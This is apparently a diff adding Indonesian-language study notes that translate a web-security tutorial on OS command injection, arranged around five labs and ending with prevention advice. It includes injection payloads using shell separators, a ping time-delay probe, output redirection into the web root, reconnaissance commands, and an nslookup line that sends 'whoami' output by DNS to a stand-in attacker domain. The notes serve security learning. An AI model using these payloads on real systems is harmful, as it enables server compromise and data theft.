@@ -1,0 +1,175 @@
+Os command Injection
+
+Apa itu OS command injection?
+
+	OS command injection juga dikenal sebagai suntikan shell. Hal ini memungkinkan penyerang untuk mengeksekusi perintah sistem operasi (OS) pada server yang menjalankan aplikasi, 
+	dan biasanya sepenuhnya kompromi aplikasi dan datanya. Seringkali, penyerang dapat memanfaatkan kerentanan injeksi perintah OS untuk mengkompromikan bagian lain dari infrastruktur hosting, 
+	dan mengeksploitasi hubungan kepercayaan untuk memutar serangan ke sistem lain dalam organisasi.
+
+Menyuntikkan perintah OS	
+
+    (LAB 1 OS command injection, simple case)
+
+
+	Dalam contoh ini, aplikasi belanja memungkinkan pengguna melihat apakah suatu barang tersedia di toko tertentu. Informasi ini diakses melalui URL:
+
+		https://insecure-website.com/stockStatus?productID=381&storeID=29
+
+	Untuk memberikan informasi saham, aplikasi harus menanyakan berbagai sistem warisan. Untuk alasan historis, fungsi ini diimplementasikan dengan menyerukan perintah shell dengan produk dan ID toko sebagai argumen:
+	
+		stockreport.pl 381 29
+
+	Perintah ini menghasilkan status saham untuk item yang ditentukan, yang dikembalikan ke pengguna.
+
+	Aplikasi ini tidak menerapkan pertahanan terhadap injeksi perintah OS, sehingga penyerang dapat mengajukan masukan berikut untuk melaksanakan perintah sewenang-wenang:
+	
+		& echo aiwefwlguh &
+
+	Jika input ini disampaikan dalam productIDparameter, perintah yang dijalankan oleh aplikasi adalah:
+	
+		stockreport.pl & echo aiwefwlguh & 29
+
+	Yang echoperintah menyebabkan string yang disediakan bergema dalam output. Ini adalah cara yang berguna untuk menguji beberapa jenis injeksi perintah OS. 
+	Yang & Karakter adalah pemisah perintah shell. Dalam contoh ini, hal ini menyebabkan tiga perintah terpisah untuk mengeksekusi, satu demi satu. Output yang dikembalikan ke pengguna adalah:
+		
+		Error - productID was not provided
+		aiwefwlguh
+		29: command not found
+
+	Tiga baris output menunjukkan bahwa:
+
+	    Yang asli stockreport.pl perintah dieksekusi tanpa argumen yang diharapkan, dan dengan demikian mengembalikan pesan kesalahan.
+	    Yang disuntikkan echo perintah dieksekusi, dan string yang disediakan bergema dalam output.
+	    Argumen yang asli 29 dieksekusi sebagai perintah, yang menyebabkan kesalahan.
+
+	Menempatkan pemisah perintah tambahan & Setelah perintah yang disuntikkan berguna karena memisahkan perintah yang disuntikkan dari apa pun yang mengikuti titik injeksi. 
+	Ini mengurangi kemungkinan bahwa apa yang berikut akan mencegah perintah yang disuntikkan dari mengeksekusi.
+
+Perintah yang berguna
+
+	Setelah Anda mengidentifikasi kerentanan injeksi perintah OS, berguna untuk mengeksekusi beberapa perintah awal untuk mendapatkan informasi tentang sistem. 
+	Di bawah ini adalah ringkasan dari beberapa perintah yang berguna pada Linux dan platform Windows:
+
+		Tujuan dari perintah 	Linux 		windows
+		
+		Nama pengguna saat ini 	whoami 		whoami
+		Sistem operasi 		uname -a 	ver
+		Konfigurasi jaringan 	ifconfig 	ipconfig /all
+		Koneksi jaringan 	netstat -an 	netstat -an
+		Proses berjalan 	ps -ef 		tasklist 
+
+Blind OS Command Injection
+
+	Banyak contoh injeksi perintah OS adalah kerentanan buta. Ini berarti bahwa aplikasi tidak mengembalikan output dari perintah dalam respon HTTP. 
+	Kerentanan buta masih bisa dieksploitasi, tetapi teknik yang berbeda diperlukan.
+
+	Sebagai contoh, bayangkan sebuah situs web yang memungkinkan pengguna mengirimkan umpan balik tentang situs tersebut. Pengguna memasukkan alamat email dan pesan umpan balik mereka. 
+	Aplikasi sisi server kemudian menghasilkan email ke administrator situs yang berisi umpan balik. Untuk melakukan ini, ia memanggil ke mailprogram dengan rincian yang dikirimkan:
+
+		mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+
+	Output dari mail perintah (jika ada) tidak dikembalikan dalam respon aplikasi, sehingga menggunakan echoPayload tidak akan bekerja. 
+	Dalam situasi ini, Anda dapat menggunakan berbagai teknik lain untuk mendeteksi dan mengeksploitasi kerentanan.
+
+Detecting blind OS command injection using time delays
+
+   (LAB 2 Blind OS command injection with time delays)
+   
+
+	Anda dapat menggunakan perintah yang disuntikkan untuk memicu penundaan waktu, 
+	memungkinkan Anda untuk mengkonfirmasi bahwa perintah itu dijalankan berdasarkan waktu yang dibutuhkan aplikasi untuk merespons. 
+	ping command adalah cara yang baik untuk melakukan ini, karena memungkinkan Anda menentukan jumlah paket ICMP untuk dikirim. 
+	Hal ini memungkinkan Anda untuk mengontrol waktu yang dibutuhkan untuk menjalankan perintah:
+
+		& ping -c 10 127.0.0.1 &
+
+	Perintah ini menyebabkan aplikasi untuk ping adaptor jaringan loopback selama 10 detik.
+
+Exploiting blind OS command injection by redirecting output
+
+  (LAB 3 Blind OS command injection with output redirection)
+  
+  
+  	Memanfaatkan injeksi perintah OS buta dengan mengarahkan output
+
+	Anda dapat mengarahkan output dari perintah yang disuntikkan ke file dalam root web yang kemudian dapat Anda ambil menggunakan browser.
+
+	 Misalnya, jika aplikasi melayani sumber daya statis dari lokasi filesystem /var/www/static, 
+	 maka Anda dapat mengirimkan masukan berikut:
+	 
+	 	& whoami > /var/www/static/whoami.txt &
+
+	> mengirimkan output dari whoamiperintah untuk file yang ditentukan. Anda kemudian dapat menggunakan browser untuk mengambil https://vulnerable-website.com/whoami.txtuntuk mengambil file, 
+	dan melihat output dari perintah yang disuntikkan.
+	
+	
+Mengeksploitaskan injeksi perintah OS buta menggunakan teknik out-of-band (OAST)
+
+  (LAB 4 Blind OS command injection dengan interaksi out-of-band)
+
+	Anda dapat menggunakan perintah yang disuntikkan yang akan memicu interaksi jaringan di luar band dengan sistem yang Anda kendalikan, menggunakan teknik OAST. Sebagai contoh:
+
+		& nslookup kgji2ohoyw.web-attacker.com &
+
+	Payload ini menggunakan nslookupperintah untuk menyebabkan pencarian DNS untuk domain yang ditentukan. Penyerang dapat memantau untuk melihat apakah pencarian terjadi, 
+	untuk mengkonfirmasi apakah perintah itu berhasil disuntikkan.
+
+  (LAB 5 Injeksi perintah OS buta dengan exfiltration data out-of-band)
+
+	Saluran out-of-band menyediakan cara mudah untuk mengeluarkan output dari perintah yang disuntikkan:
+	
+		& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+	Hal ini menyebabkan pencarian DNS ke domain penyerang yang berisi hasil whoamiperintah:
+		
+		wwwuser.kgji2ohoyw.web-attacker.com
+
+Cara menyuntikkan perintah OS
+
+	Anda dapat menggunakan sejumlah metacharacter shell untuk melakukan serangan injeksi perintah OS.
+
+	Sejumlah karakter berfungsi sebagai pemisah perintah, memungkinkan perintah untuk dirantai bersama. Pemisah perintah berikut bekerja pada sistem berbasis Windows dan Unix:
+
+		    &
+		    &&
+		    |
+		    ||
+
+	Pemisah perintah berikut hanya bekerja pada sistem berbasis Unix:
+
+	    ;
+	    Garis baru ( 0x0a atau \n)
+
+	Pada sistem berbasis Unix, Anda juga dapat menggunakan backticks atau karakter dolar untuk melakukan eksekusi inline dari perintah yang disuntikkan dalam perintah asli:
+
+		    `
+		    perintah yang disuntik`
+		    $(
+		    perintah yang disuntik)
+
+	Metacharacters shell yang berbeda memiliki perilaku yang sangat berbeda yang mungkin mengubah apakah mereka bekerja dalam situasi tertentu. 
+	Hal ini dapat berdampak pada apakah mereka mengizinkan pengambilan output perintah atau hanya berguna untuk eksploitasi buta.
+
+	Terkadang, input yang Anda kendalikan muncul dalam tanda kutip dalam perintah asli. Dalam situasi ini, 
+	Anda perlu mengakhiri konteks yang dikutip (dengan menggunakan "atau ') sebelum menggunakan metacharacters shell yang sesuai untuk menyuntikkan perintah baru.
+
+Cara Mencegah Serangan Suntikan Perintah OS
+
+	Cara yang paling efektif untuk mencegah kerentanan injeksi perintah OS adalah untuk tidak pernah memanggil perintah OS dari kode alat-layer aplikasi. 
+	Dalam hampir semua kasus, ada berbagai cara untuk mengimplementasikan fungsi yang diperlukan menggunakan API platform yang lebih aman.
+
+	Jika Anda harus memanggil perintah OS dengan input yang disediakan pengguna, maka Anda harus melakukan validasi input yang kuat. Beberapa contoh validasi yang efektif meliputi:
+
+	    Memvalidasi terhadap daftar putih nilai-nilai yang diizinkan.
+	    Menghargai bahwa input adalah angka.
+	    Memvalidasi bahwa input hanya mengandung karakter alfanumerik, tidak ada sintaks atau whitespace lainnya.
+
+	Jangan pernah mencoba untuk membersihkan input dengan melarikan diri dari metacharacters shell. Dalam prakteknya, ini terlalu rawan kesalahan dan rentan untuk dilewati oleh penyerang yang terampil.
+
+
+
+
+
+
+
+
